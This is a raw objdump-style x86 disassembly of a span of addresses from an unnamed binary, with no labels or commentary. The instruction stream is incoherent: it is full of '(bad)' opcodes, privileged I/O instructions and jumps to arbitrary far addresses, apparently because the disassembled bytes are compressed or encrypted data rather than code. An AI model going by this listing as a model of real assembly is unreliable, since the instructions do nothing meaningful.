  403f19:	xchg   ecx,eax
  403f1a:	cs pushf 
  403f1c:	xor    BYTE PTR [edi+0x1d1aacf1],0x2a
  403f23:	sti    
  403f24:	scas   eax,DWORD PTR es:[edi]
  403f25:	jmp    FWORD PTR [eax+0x3f]
  403f28:	add    DWORD PTR [ebx],esp
  403f2a:	test   BYTE PTR [edi],dh
  403f2c:	dec    ecx
  403f2d:	scas   al,BYTE PTR es:[edi]
  403f2e:	pop    ebx
  403f2f:	pusha  
  403f30:	das    
  403f31:	and    BYTE PTR [eax],bh
  403f33:	mov    eax,ds:0x89081785
  403f38:	arpl   bx,bp
  403f3a:	inc    edx
  403f3b:	inc    edx
  403f3c:	mov    esp,0x40957fd6
  403f41:	(bad)  
  403f45:	mov    ch,0xa0
  403f47:	je     0x403fb3
  403f49:	and    ecx,DWORD PTR [edx]
  403f4b:	lds    esp,FWORD PTR [ebp-0x4325f4d9]
  403f51:	or     ecx,eax
  403f53:	aaa    
  403f54:	ins    DWORD PTR es:[edi],dx
  403f55:	xchg   esp,eax
  403f56:	sub    esi,DWORD PTR [ebx+0x747e359a]
  403f5c:	xor    eax,0xdcfc25c4
  403f61:	jne    0x403f4e
  403f63:	cdq    
  403f64:	and    DWORD PTR [eax-0x4934bcfc],edi
  403f6a:	sbb    al,BYTE PTR [edx]
  403f6c:	popa   
  403f6d:	mov    al,0xce
  403f6f:	push   cs
  403f70:	ss or  cl,0x2e
  403f74:	cmp    esi,ecx
  403f76:	pop    esp
  403f77:	test   al,0xa
  403f79:	mov    bl,0xc7
  403f7b:	jb     0x403fc8
  403f7d:	xchg   esp,eax
  403f7e:	pop    eax
  403f7f:	clc    
  403f80:	into   
  403f81:	mov    ds:0x5f6cff0f,al
  403f86:	stc    
  403f87:	xchg   ebp,eax
  403f88:	add    ch,BYTE PTR [ebx-0x6]
  403f8b:	or     DWORD PTR [esi+0x2d],eax
  403f8e:	inc    ebp
  403f8f:	outs   dx,DWORD PTR ds:[esi]
  403f90:	cmp    eax,0xded86efb
  403f95:	lahf   
  403f96:	lock pop DWORD PTR [ebx+0x3cb2c478]
  403f9d:	inc    esi
  403f9e:	popa   
  403f9f:	pop    eax
  403fa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa1:	outs   dx,BYTE PTR ds:[esi]
  403fa2:	shr    BYTE PTR [ebx],1
  403fa4:	add    BYTE PTR [ebx-0x29],al
  403fa7:	xchg   esp,eax
  403fa8:	call   0x18c367
  403fad:	adc    eax,0xa946088b
  403fb2:	test   eax,0x739f7192
  403fb7:	aaa    
  403fb8:	cmp    edx,ecx
  403fba:	mov    bh,BYTE PTR [edx+0x13]
  403fbd:	aam    0x83
  403fbf:	out    dx,al
  403fc0:	sbb    dh,cl
  403fc2:	cwde   
  403fc3:	xor    DWORD PTR [esp+edi*4],esp
  403fc6:	rcr    DWORD PTR [esi],cl
  403fc8:	imul   ebx,DWORD PTR [esi-0x9b58fb9],0x585dcad6
  403fd2:	push   0xe5f7e491
  403fd7:	mov    dl,0x7b
  403fd9:	lods   eax,DWORD PTR ds:[esi]
  403fda:	retf   
  403fdb:	xchg   ecx,eax
  403fdc:	int3   
  403fdd:	ret    
  403fde:	xor    BYTE PTR ds:0x3a84151a,cl
  403fe4:	je     0x40404d
  403fe6:	fld    DWORD PTR [ecx+0x13d1aba5]
  403fec:	mov    bh,0xb0
  403fee:	dec    ebp
  403fef:	in     eax,0x4a
  403ff1:	pop    eax
  403ff2:	mov    bl,0xa9
  403ff4:	jg     0x403fb5
  403ff6:	dec    esp
  403ff7:	les    edi,FWORD PTR [ebp+0x7f]
  403ffa:	imul   esp,ecx,0xacf899f8
  404000:	cwde   
  404001:	cwde   
  404002:	xor    al,cl
  404004:	xor    dh,BYTE PTR [ebp+0x51f407d1]
  40400a:	gs jmp 0x40402b
  40400d:	daa    
  40400e:	mov    BYTE PTR [eax],dl
  404010:	sbb    eax,0xf808bf3
  404015:	out    0xbc,eax
  404017:	push   eax
  404018:	xor    BYTE PTR [ebx+edx*1],0xa3
  40401c:	das    
  40401d:	jmp    0xe664a03d
  404022:	shl    BYTE PTR fs:[ebx],cl
  404025:	not    ecx
  404027:	pop    eax
  404028:	hlt    
  404029:	add    ah,dl
  40402b:	sub    BYTE PTR [ebp+ebx*1-0x56],bh
  40402f:	mov    ch,0x62
  404031:	adc    al,BYTE PTR [ebp-0x45]
  404034:	push   eax
  404035:	test   al,0x47
  404037:	mov    DWORD PTR [edi+ebp*1+0x6d],edx
  40403b:	jns    0x404083
  40403d:	push   ebx
  40403e:	jge    0x4040b6
  404040:	rol    BYTE PTR [ebp-0x4b2be2a0],1
  404046:	pop    es
  404047:	repnz lds ecx,FWORD PTR [esi+0x4e18e482]
  40404e:	fld    TBYTE PTR [edi-0x38]
  404051:	test   DWORD PTR [edx+0x1d],eax
  404054:	scas   al,BYTE PTR es:[edi]
  404055:	and    al,0x5c
  404057:	ja     0x404032
  404059:	mov    edi,DWORD PTR [ebp+0x58780f89]
  40405f:	xchg   ebx,eax
  404060:	add    al,0x51
  404063:	fwait
  404064:	xchg   ebx,eax
  404065:	mov    ebp,cs
  404067:	jp     0x404039
  404069:	ja     0x404003
  40406b:	and    DWORD PTR [ecx],0xdcc64d06
  404071:	sbb    ch,ah
  404073:	das    
  404074:	or     BYTE PTR [esp+eiz*4-0x66],ch
  404078:	call   0x8f1c:0x4f206715
  40407f:	push   0x51
  404081:	leave  
  404082:	iret   
  404083:	jle    0x40408d
  404085:	lds    ebp,FWORD PTR [edi]
  404087:	sti    
  404088:	pop    eax
  404089:	out    0x51,al
  40408b:	inc    esi
  40408c:	stos   DWORD PTR es:[edi],eax
  40408d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40408e:	mov    esi,0x2d9a065
  404093:	xchg   ebx,eax
  404094:	test   ecx,ebp
  404096:	mov    ecx,0x183d55ba
  40409b:	(bad)  [ebx+0x3913895a]
  4040a1:	cmc    
  4040a2:	dec    ebp
  4040a3:	xor    ebx,DWORD PTR [esi]
  4040a5:	in     eax,dx
  4040a6:	mov    WORD PTR [ebx+0x2dc9f215],es
  4040ac:	ss cdq 
  4040ae:	ret    0xef6b
  4040b1:	lods   eax,DWORD PTR ds:[esi]
  4040b2:	mov    eax,ds:0xbb7f2672
  4040b7:	push   es
  4040b8:	add    al,0xd8
  4040ba:	loope  0x404112
  4040bc:	out    dx,eax
  4040bd:	dec    ebp
  4040be:	add    eax,0xd585aa08
  4040c3:	push   ss
  4040c4:	add    eax,0x1013e20d
  4040c9:	fldcw  WORD PTR [edx]
  4040cb:	test   al,0x96
  4040cd:	cmp    ch,al
  4040cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d0:	mov    al,ds:0x3629e344
  4040d5:	ja     0x404127
  4040d7:	jge    0x40408d
  4040d9:	adc    eax,0xb58b4bd
  4040de:	inc    edx
  4040df:	int3   
  4040e0:	mov    ch,0xb0
  4040e2:	loope  0x404086
  4040e4:	nop    DWORD PTR [ecx-0x3f]
  4040e8:	cmp    BYTE PTR [ecx-0x19],ch
  4040eb:	arpl   WORD PTR [ebp+0x7c550655],sp
  4040f1:	or     eax,0x8fa7798e
  4040f6:	sbb    bl,bh
  4040f8:	shl    DWORD PTR [ebx+0x6aefa97e],cl
  4040fe:	mov    eax,0x19c694c
  404103:	adc    dh,bh
  404105:	pop    eax
  404106:	push   edx
  404107:	mov    cl,0x9e
  404109:	outs   dx,BYTE PTR ds:[esi]
  40410a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40410b:	out    0x73,al
  40410d:	push   0x5773b52d
  404112:	push   ebp
  404113:	xor    al,0xe0
  404115:	mov    cl,0x1a
  404117:	sub    al,0x27
  404119:	fisttp DWORD PTR [edx+ecx*2]
  40411c:	icebp  
  40411d:	pop    eax
  40411e:	int3   
  40411f:	fwait
  404120:	mov    esi,0xc03d7d4e
  404125:	sub    bh,al
  404127:	or     ch,BYTE PTR [ecx-0x3099f4]
  40412d:	add    al,0xaa
  40412f:	test   al,0xa3
  404131:	xchg   ch,bh
  404133:	or     eax,0xb9cc8b5b
  404138:	push   ebx
  404139:	nop
  40413a:	stc    
  40413b:	xor    eax,0xbe59643e
  404140:	dec    ecx
  404141:	jmp    0x69a9:0xd5927a68
  404148:	out    dx,al
  404149:	and    ch,al
  40414b:	sub    eax,DWORD PTR [ecx]
  40414d:	sbb    BYTE PTR [ebx-0x12],dh
  404150:	mov    ecx,0x68cc4cbc
  404155:	add    DWORD PTR [esi-0x36e9c7af],esp
  40415b:	push   ds
  40415c:	in     eax,dx
  40415d:	cmc    
  40415e:	rcl    BYTE PTR [edx+0x522975ec],0x91
  404165:	fcomp  QWORD PTR [ebp+0x17addd5a]
  40416b:	nop
  40416c:	lds    eax,FWORD PTR [esi]
  40416e:	inc    esi
  40416f:	pop    gs
  404171:	push   ebp
  404172:	stc    
  404173:	push   ebx
  404174:	imul   edx,ebx,0x37ccff60
  40417a:	ror    BYTE PTR [ecx+0xa1bae5e],cl
  404180:	loopne 0x4041a5
  404182:	imul   BYTE PTR [ebx+0x5a41eebd]
  404188:	sti    
  404189:	sub    al,0x4f
  40418b:	jge    0x4041c0
  40418d:	mov    eax,ds:0x78723c7e
  404192:	neg    ecx
  404194:	daa    
  404195:	and    ecx,eax
  404197:	jae    0x404214
  404199:	(bad)  
  40419a:	pop    eax
  40419b:	or     BYTE PTR [edi+0x38],bl
  40419e:	push   eax
  40419f:	je     0x4041e9
  4041a1:	push   es
  4041a2:	enter  0x4582,0x7e
  4041a6:	sbb    DWORD PTR [ebx],edi
  4041a8:	jmp    0xe5a0:0xf1889aea
  4041af:	js     0x404212
  4041b1:	pop    DWORD PTR [ecx+esi*4+0x1a3d8c26]
  4041b8:	daa    
  4041b9:	fldenv [edi+0xf8461db]
  4041bf:	sub    DWORD PTR [edx+eax*8+0x26eb725c],esp
  4041c6:	neg    DWORD PTR [eax]
  4041c8:	xchg   edi,eax
  4041c9:	(bad)  
  4041ca:	fist   WORD PTR [ecx-0x4e]
  4041cd:	jae    0x40417c
  4041cf:	fisttp DWORD PTR [ebx-0x56de5958]
  4041d5:	sbb    al,0x7f
  4041d7:	mov    esi,0xad0f1f63
  4041dc:	push   0x51277fd8
  4041e1:	sub    ecx,DWORD PTR [ebx]
  4041e3:	mov    ecx,0xe9433b12
  4041e8:	add    eax,0xb0724443
  4041ed:	outs   dx,BYTE PTR ds:[esi]
  4041ee:	adc    al,0x6d
  4041f0:	add    ah,BYTE PTR [eax]
  4041f2:	clc    
  4041f3:	jnp    0x4041c5
  4041f5:	dec    esi
  4041f6:	stc    
  4041f7:	inc    edx
  4041f8:	jmp    0x2b075831
  4041fd:	sub    ebx,DWORD PTR [esi+0x5d]
  404200:	inc    esp
  404201:	sbb    al,0xc9
  404203:	add    al,0x9d
  404205:	jl     0x4041a3
  404207:	cli    
  404208:	cs sub eax,0xa2f739e3
  40420e:	aam    0x71
  404210:	push   edx
  404211:	xor    bl,bh
  404213:	daa    
  404214:	jae    0x4041fd
  404216:	aas    
  404217:	loopne 0x4041b3
  404219:	sub    ch,BYTE PTR [edx]
  40421b:	jge    0x40426f
  40421d:	push   ss
  40421e:	inc    edx
  40421f:	add    eax,0x9e508d25
  404224:	or     bh,BYTE PTR [ebx-0x21]
  404227:	mov    esi,0x83103263
  40422c:	jno    0x4041c7
  40422e:	mov    esp,0x766d7ad6
  404233:	cmp    al,0x34
  404235:	pop    esp
  404236:	push   es
  404237:	dec    eax
  404238:	cs inc ecx
  40423a:	fcomp  QWORD PTR [ebp+0x79]
  40423d:	dec    ebx
  40423e:	or     cl,BYTE PTR [ecx+0x2a]
  404241:	loop   0x4042a9
  404243:	arpl   WORD PTR [ecx+0x5b],di
  404246:	or     dl,bl
  404248:	xchg   edx,eax
  404249:	out    0xf1,eax
  40424b:	dec    eax
  40424c:	mov    bl,0x33
  40424e:	cmp    ecx,DWORD PTR [edi+edx*1+0x3d]
  404252:	cmp    dl,BYTE PTR [edi-0x22]
  404255:	pop    DWORD PTR [esi-0x41]
  404258:	sbb    eax,0xc6219280
  40425d:	loope  0x404263
  40425f:	loope  0x40429c
  404261:	xchg   ebp,eax
  404262:	push   ds
  404263:	out    0xa,eax
  404265:	aam    0xa4
  404267:	xchg   ebp,eax
  404268:	ins    BYTE PTR es:[edi],dx
  404269:	xor    eax,0x33fec6f6
  40426e:	sub    dl,BYTE PTR [ebp+0x79df2d1d]
  404274:	adc    al,BYTE PTR [eax-0x44904838]
  40427a:	mov    al,0xb5
  40427c:	mov    edx,0x3bebf66b
  404281:	in     eax,0xd1
  404283:	or     eax,0x567133d5
  404289:	std    
  40428a:	pop    ebp
  40428b:	inc    eax
  40428c:	int3   
  40428d:	sti    
  40428e:	mov    dl,0xac
  404290:	mov    esp,0xf4577944
  404295:	into   
  404296:	jl     0x4042b6
  404298:	jb     0x404260
  40429a:	sub    eax,0x1c85a08c
  40429f:	or     cl,BYTE PTR [edx-0x75667b9e]
  4042a5:	adc    al,0x3a
  4042a7:	add    BYTE PTR [eax+ecx*2-0x4c],0xb9
  4042ac:	out    0x21,al
  4042ae:	outs   dx,DWORD PTR ds:[esi]
  4042af:	xor    cl,BYTE PTR [esp+ebx*8+0x48]
  4042b3:	push   ebx
  4042b4:	(bad)  
  4042b6:	call   0xaf0b:0x5cc73d2f
  4042bd:	fld    QWORD PTR [ebp-0x27]
  4042c0:	jbe    0x4042e4
  4042c2:	dec    eax
  4042c3:	push   edx
  4042c4:	add    cl,BYTE PTR [ecx+0x46]
  4042c7:	xchg   ebp,eax
  4042c8:	call   0xeb38:0x94606cb1
  4042cf:	icebp  
  4042d0:	mov    ch,0xf6
  4042d2:	retf   0x7f5a
  4042d5:	loopne 0x4042a2
  4042d7:	jle    0x4042c6
  4042d9:	cmc    
  4042da:	and    eax,0x63b2acd4
  4042df:	or     BYTE PTR [eax+0x7c],dh
  4042e2:	adc    ah,BYTE PTR [ecx+0x2a]
  4042e5:	mov    bx,0xaa9
  4042e9:	cmc    
  4042ea:	imul   ebp,DWORD PTR [edi],0x3caca70d
  4042f0:	dec    edi
  4042f1:	(bad)  
  4042f2:	jno    0x40435b
  4042f4:	add    eax,0x690df350
  4042f9:	inc    esp
  4042fa:	fstp   DWORD PTR [eax+0x7d]
  4042fd:	into   
  4042fe:	mov    bl,0xc1
  404300:	jp     0x40434c
  404302:	dec    esp
  404303:	imul   edx,DWORD PTR [eax+0x78201b52],0xffffff9a
  40430a:	aad    0x56
  40430c:	lods   eax,DWORD PTR ds:[esi]
  40430d:	jmp    0x9908c391
  404312:	sahf   
  404313:	scas   al,BYTE PTR es:[edi]
  404314:	pop    ecx
  404315:	ds xchg esp,eax
  404317:	popf   
  404318:	sbb    eax,0x262a5897
  40431d:	dec    ebx
  40431e:	add    bp,cx
  404321:	jb     0x4042b4
  404323:	outs   dx,BYTE PTR ds:[esi]
  404324:	enter  0xa344,0xd2
  404328:	jno    0x40437b
  40432a:	(bad)  [ecx-0x40]
  40432d:	add    eax,0xe3aef0e4
  404332:	and    BYTE PTR [esi+eiz*4],bl
  404335:	out    0xf3,eax
  404337:	test   DWORD PTR [ebp-0x1c],0x51b13d92
  40433e:	mov    ss,WORD PTR [edi+0x46]
  404341:	jo     0x4042cb
  404343:	sub    dl,BYTE PTR [edx-0x53758718]
  404349:	push   cs
  40434a:	lods   eax,DWORD PTR ds:[esi]
  40434b:	jg     0x4042f0
  40434d:	(bad)  
  40434e:	fidiv  WORD PTR [eax-0x49]
  404351:	pop    es
  404352:	stos   BYTE PTR es:[edi],al
  404353:	push   ecx
  404354:	int3   
  404355:	ret    0xcee0
  404358:	lods   al,BYTE PTR ds:[esi]
  404359:	or     eax,0x14dcd462
  40435e:	inc    ebp
  40435f:	pop    esi
  404360:	xor    DWORD PTR [edx],esp
  404362:	(bad)  
  404364:	shl    ah,0xac
  404367:	cmp    eax,0xdd4445e
  40436c:	into   
  40436d:	cld    
  40436e:	pop    ss
  40436f:	call   0xe385:0xbf861c05
  404376:	dec    eax
  404377:	cmp    al,BYTE PTR [eax+0x2b6744d9]
  40437d:	mov    edx,0x9747231
  404382:	sti    
  404383:	ret    0xbd22
  404386:	push   ds
  404387:	call   0xba2984e9
  40438c:	aaa    
  40438d:	pop    ds
  40438e:	push   ss
  40438f:	push   edi
  404390:	nop
  404391:	push   ecx
  404392:	xlat   BYTE PTR ds:[ebx]
  404393:	rol    BYTE PTR [eax-0x7c],1
  404396:	repnz pop esp
  404398:	inc    edx
  404399:	or     ch,BYTE PTR [edi-0x3d]
  40439c:	push   esp
  40439d:	dec    ecx
  40439e:	or     ch,BYTE PTR [esi-0x67cd0543]
  4043a4:	adc    edx,esi
  4043a6:	out    dx,eax
  4043a7:	ror    eax,1
  4043a9:	fdivp  st(7),st
  4043ab:	add    al,0x59
  4043ad:	(bad)  
  4043ae:	out    dx,eax
  4043af:	jmp    0x404385
  4043b1:	inc    edx
  4043b2:	jl     0x4043fe
  4043b4:	ret    0xeb2c
  4043b7:	add    DWORD PTR [edx-0x45a70dcf],ecx
  4043bd:	sahf   
  4043be:	sbb    al,0xf0
  4043c0:	push   ebp
  4043c1:	(bad)  
  4043c2:	sahf   
  4043c3:	pop    ds
  4043c4:	leave  
  4043c5:	cli    
  4043c6:	dec    ecx
  4043c7:	mov    ds:0x91ee18b2,al
  4043cc:	int    0x5a
  4043ce:	test   DWORD PTR [ebx],ecx
  4043d0:	cmp    DWORD PTR [edi-0x1be7167],edi
  4043d6:	lock push edx
  4043d8:	or     eax,edx
  4043da:	cdq    
  4043db:	xor    edi,esp
  4043dd:	daa    
  4043de:	jge    0x4043fc
  4043e0:	or     esi,esp
  4043e2:	sub    DWORD PTR [ecx],esp
  4043e4:	sar    DWORD PTR [eax+0x5760601e],0x24
  4043eb:	stos   DWORD PTR es:[edi],eax
  4043ec:	enter  0x7e2f,0xfc
  4043f0:	(bad)  
  4043f1:	lods   eax,DWORD PTR ds:[esi]
  4043f2:	mov    ebx,edi
  4043f4:	or     eax,0xf2acb6df
  4043f9:	int    0x0
  4043fb:	pop    esi
  4043fc:	pop    ebx
  4043fd:	call   FWORD PTR [eax-0x3e]
  404400:	sbb    cl,BYTE PTR [ebp+eiz*4+0x313fe63]
  404407:	mov    ecx,0xa19886f1
  40440c:	or     al,0x77
  40440e:	dec    esi
  40440f:	sub    esi,edx
  404411:	sbb    eax,eax
  404413:	test   BYTE PTR [eax],bl
  404415:	sbb    cl,0xa6
  404418:	leave  
  404419:	gs and al,0x79
  40441c:	sbb    DWORD PTR [esi-0x32c668da],esp
  404422:	fimul  DWORD PTR [edi-0x5c]
  404425:	(bad)  
  404426:	fcom   DWORD PTR [ecx]
  404428:	rol    BYTE PTR [ecx+eax*2-0x2edffe5c],cl
  40442f:	jo     0x40443c
  404431:	or     dh,cl
  404433:	lea    esp,[ebp+ecx*1+0x4d]
  404437:	pop    ss
  404438:	test   ebx,edx
  40443a:	mov    ds:0xb9f29904,al
  40443f:	mov    edx,0x449d11be
  404444:	sahf   
  404445:	push   ebp
  404446:	fist   WORD PTR [edx+0xb]
  404449:	pop    esp
  40444a:	jno    0x404414
  40444c:	xchg   edi,eax
  40444d:	les    edx,FWORD PTR [ecx-0xc]
  404450:	cld    
  404451:	push   0x7d89ba17
  404456:	xor    edx,DWORD PTR ds:0x6ac728b4
  40445c:	dec    edi
  40445d:	xlat   BYTE PTR ds:[ebx]
  40445e:	test   eax,0xd9dcc22a
  404463:	out    dx,eax
  404464:	mov    dh,0xf
  404466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404467:	jo     0x404434
  404469:	scas   eax,DWORD PTR es:[edi]
  40446a:	and    BYTE PTR [edx+ebx*2+0x40746d2e],ch
  404471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404472:	fbld   TBYTE PTR [ebp+0x31]
  404475:	push   esp
  404476:	es dec esp
  404478:	dec    ecx
  404479:	jmp    0xf99e00b7
  40447e:	mov    WORD PTR [ebp+0x2604c544],es
  404484:	mov    esi,0xbd977ac5
  404489:	test   DWORD PTR [eax],ebx
  40448b:	std    
  40448c:	out    dx,eax
  40448d:	icebp  
  40448e:	adc    al,0x62
  404490:	inc    eax
  404491:	icebp  
  404492:	pop    ebp
  404493:	pushf  
  404494:	into   
  404495:	dec    edx
  404496:	add    BYTE PTR [esi-0x93e3ddf],dl
  40449c:	add    al,0xdc
  40449e:	addr16 sub eax,eax
  4044a1:	sbb    eax,0xf6871869
  4044a6:	jg     0x404470
  4044a8:	push   ebx
  4044a9:	out    dx,eax
  4044aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ab:	loop   0x4044a1
  4044ad:	mov    eax,0x48391c69
  4044b2:	cs cs ja 0x404472
  4044b6:	cld    
  4044b7:	int    0x6d
  4044b9:	add    ebx,DWORD PTR [eax+edi*1-0x72941514]
  4044c0:	ins    DWORD PTR es:[edi],dx
  4044c1:	das    
  4044c2:	call   0x90bc:0xc5dd79b5
  4044c9:	das    
  4044ca:	and    DWORD PTR [ecx+0x643aff26],eax
  4044d0:	pop    ds
  4044d1:	xchg   edi,eax
  4044d2:	jecxz  0x404488
  4044d4:	adc    eax,0xa08a703c
  4044d9:	sub    DWORD PTR [edi-0x5],ebp
  4044dc:	in     al,dx
  4044dd:	sbb    al,BYTE PTR [edi+0x5b5c7339]
  4044e3:	add    ecx,DWORD PTR [ebp-0x68afd0c]
  4044e9:	fidivr DWORD PTR [edi+0x3]
  4044ec:	je     0x404536
  4044ee:	imul   eax,DWORD PTR ds:0xc18888ed,0xad962b19
  4044f8:	jno    0x404579
  4044fa:	push   cs
  4044fb:	dec    eax
  4044fc:	int    0x6e
  4044fe:	xchg   esp,eax
  4044ff:	scas   al,BYTE PTR es:[edi]
  404500:	cdq    
  404501:	inc    edi
  404502:	iret   
  404503:	mov    al,0xb6
  404505:	sub    cl,0x4a
  404508:	sbb    eax,0x30d3104e
  40450d:	or     al,0x40
  40450f:	xchg   esi,eax
  404510:	test   BYTE PTR [ebx],0x82
  404513:	shr    dh,0x1a
  404516:	int    0x73
  404518:	dec    esi
  404519:	data16 mov ds:0x86c1d386,al
  40451f:	fidivr WORD PTR [eax]
  404521:	jp     0x40457f
  404523:	push   edx
  404524:	lods   al,BYTE PTR ds:[esi]
  404525:	dec    ebx
  404526:	mov    cl,0xed
  404528:	push   ebx
  404529:	loopne 0x4044c1
  40452b:	call   0xfeafd826
  404530:	rol    DWORD PTR [ecx+ebx*1-0x31],cl
  404534:	idiv   al
  404536:	mov    ah,0xf5
  404538:	pop    ebp
  404539:	mov    edi,0xe38dbedd
  40453e:	bound  ecx,QWORD PTR [edi]
  404540:	add    BYTE PTR [edi],bl
  404542:	sub    DWORD PTR [ebx-0x714d6ff],ecx
  404548:	test   BYTE PTR [esi+0x5f],dl
  40454b:	fist   DWORD PTR [edx+0x605ea763]
  404551:	xor    edi,DWORD PTR [esi+0x77]
  404554:	inc    esi
  404555:	mov    al,ds:0x72497f6a
  40455a:	cld    
  40455b:	movnti DWORD PTR [edx-0x6339ac51],edx
  404562:	std    
  404563:	cmp    ecx,ebx
  404565:	adc    DWORD PTR [ebp-0x4b],ecx
  404568:	dec    ebp
  404569:	and    ecx,0x8b9c6509
  40456f:	(bad)  
  404571:	xor    edx,DWORD PTR [eax-0x5e]
  404574:	sti    
  404575:	fisub  WORD PTR ds:0x94a10162
  40457b:	cdq    
  40457c:	adc    DWORD PTR [edi-0x2fd8bab6],ebp
  404582:	xchg   ecx,eax
  404583:	ficomp WORD PTR [edi]
  404585:	in     al,dx
  404586:	jmp    0x639aa5ce
  40458b:	les    edi,FWORD PTR [ebx+0x1d96850e]
  404591:	cmp    bl,cl
  404593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404594:	and    eax,0xf2e32fcd
  404599:	dec    esp
  40459a:	mov    bh,0x15
  40459c:	lods   al,BYTE PTR ds:[esi]
  40459d:	cld    
  40459e:	(bad)  
  40459f:	lock jnp 0x4045ce
  4045a2:	cwde   
  4045a3:	int    0xa3
  4045a5:	out    dx,eax
  4045a6:	pop    eax
  4045a7:	into   
  4045a8:	xor    eax,0xf359d66c
  4045ad:	mov    ah,0xed
  4045af:	cmp    cl,BYTE PTR [ebx]
  4045b1:	mov    BYTE PTR [esi],ah
  4045b3:	out    0x8e,al
  4045b5:	sub    DWORD PTR [ebp+0x4f7a8b2e],ecx
  4045bb:	out    dx,al
  4045bc:	test   BYTE PTR [edi],al
  4045be:	out    dx,al
  4045bf:	std    
  4045c0:	cs dec eax
  4045c2:	dec    ebp
  4045c3:	dec    eax
  4045c4:	std    
  4045c5:	in     eax,0x4b
  4045c7:	add    BYTE PTR [ecx+0x6b],dl
  4045ca:	push   ebx
  4045cb:	inc    ebx
  4045cc:	cmp    al,0x4b
  4045ce:	adc    DWORD PTR ds:0xb4c350c3,ecx
  4045d4:	add    ecx,DWORD PTR [ecx-0x1aa2bf0e]
  4045da:	sub    eax,0xa11f7808
  4045df:	push   eax
  4045e0:	mov    DWORD PTR [ebx],eax
  4045e2:	sub    ebp,edx
  4045e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045e5:	mov    BYTE PTR [ebx],cl
  4045e7:	mov    edx,0x9c8d835b
  4045ec:	push   es
  4045ed:	sbb    al,0xbd
  4045ef:	sahf   
  4045f0:	outs   dx,BYTE PTR ds:[esi]
  4045f1:	ret    0xa1e0
  4045f4:	mov    dh,0x88
  4045f6:	hlt    
  4045f7:	push   0xa
  4045f9:	cmp    BYTE PTR [ecx+0x656eb327],bh
  4045ff:	int    0xb6
  404601:	dec    ebx
  404602:	cld    
  404603:	mov    esp,0x1aac76cb
  404608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404609:	aad    0xfb
  40460b:	xor    edi,edi
  40460d:	lahf   
  40460e:	sar    BYTE PTR [ebx+ebx*1-0x3184cbd2],0x13
  404616:	(bad)  
  404617:	jmp    0xfd803e44
  40461c:	mov    BYTE PTR [ebp+eiz*8+0x43affa0f],ch
  404623:	test   bh,bh
  404625:	(bad)  
  404626:	out    0x80,eax
  404628:	cwde   
  404629:	enter  0xcc19,0x63
  40462d:	test   eax,0xc430bfb4
  404632:	xor    esp,esi
  404634:	loop   0x4045d4
  404636:	cs ss sahf 
  404639:	mov    WORD PTR [esi+ebp*2-0x30a5555d],?
  404640:	jb     0x4045ef
  404642:	cdq    
  404643:	mov    BYTE PTR [ecx+0x7d5dc066],bl
  404649:	rcl    DWORD PTR [edi],cl
  40464b:	mov    bh,0xe4
  40464d:	cwde   
  40464e:	xor    esi,DWORD PTR [edi+eax*1]
  404651:	(bad)  
  404652:	jno    0x4046bb
  404654:	repnz cmp ah,cl
  404657:	inc    edi
  404658:	push   ebx
  404659:	jle    0x404605
  40465b:	xchg   ax,ax
  40465d:	adc    bl,BYTE PTR [edi+0x49]
  404660:	dec    esp
  404661:	mov    bh,0x9
  404663:	repnz add DWORD PTR [edi+0x397e3834],edx
  40466a:	es xor eax,0x790a25d6
  404670:	xor    BYTE PTR [edx-0x1af69b2d],bl
  404676:	inc    ebp
  404677:	mov    edi,DWORD PTR [eax-0x13]
  40467a:	add    esi,DWORD PTR [ebx-0x7e13e948]
  404680:	sti    
  404681:	and    dh,al
  404683:	pop    ebp
  404684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404685:	push   ebx
  404686:	and    al,0x17
  404688:	xor    al,0x52
  40468a:	cmp    eax,0x7c1c715
  40468f:	pop    edi
  404690:	and    BYTE PTR [esi],cl
  404692:	pop    ecx
  404693:	jb     0x404616
  404695:	mov    ch,0xf9
  404697:	test   eax,0xe13dd3cb
  40469c:	add    eax,0x1e965cf2
  4046a1:	adc    eax,0x7bd17036
  4046a6:	push   0xefcc8f6f
  4046ab:	retf   
  4046ac:	mov    es,ecx
  4046ae:	(bad)  
  4046af:	int    0x36
  4046b1:	mov    eax,0x9d46e933
  4046b6:	pop    edx
  4046b7:	cmc    
  4046b8:	sbb    DWORD PTR [ebx],edi
  4046ba:	imul   edx,DWORD PTR [ebp-0x6b8cf638],0x38
  4046c1:	xchg   esp,eax
  4046c2:	shl    DWORD PTR [ecx-0x1fac1312],0x60
  4046c9:	cdq    
  4046ca:	imul   edx,DWORD PTR [ebx+0x4c69689d],0x5a
  4046d1:	xchg   edi,eax
  4046d2:	(bad)  
  4046d3:	sub    BYTE PTR [eax-0x35],dh
  4046d6:	cmp    al,0xa2
  4046d8:	sub    al,0x80
  4046da:	sbb    eax,DWORD PTR [esi+0x25]
  4046dd:	add    esp,ebp
  4046df:	inc    edx
  4046e0:	and    BYTE PTR [ebx],ah
  4046e2:	jno    0x404694
  4046e4:	jl     0x4046ca
  4046e6:	cmp    eax,DWORD PTR [eax+0x73]
  4046e9:	sub    DWORD PTR [ecx-0x25df3c1d],ecx
  4046ef:	retf   0x1b68
  4046f2:	iret   
  4046f3:	clc    
  4046f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f5:	(bad)  
  4046f6:	sub    esp,DWORD PTR [eax]
  4046f8:	or     BYTE PTR [ebp-0x67b11e2e],dl
  4046fe:	dec    esp
  4046ff:	sub    eax,0xd29ba387
  404704:	jnp    0x404733
  404706:	mul    ch
  404708:	nop
  404709:	push   cs
  40470a:	sbb    ebx,DWORD PTR [ebx]
  40470c:	int3   
  40470d:	or     dh,0x62
  404710:	popa   
  404711:	(bad)  
  404712:	mov    dh,0x8e
  404714:	push   es
  404715:	sub    DWORD PTR [esp],ebx
  404718:	call   0xc68c6b02
  40471d:	xor    DWORD PTR [edi+0x52],eax
  404720:	stos   BYTE PTR es:[edi],al
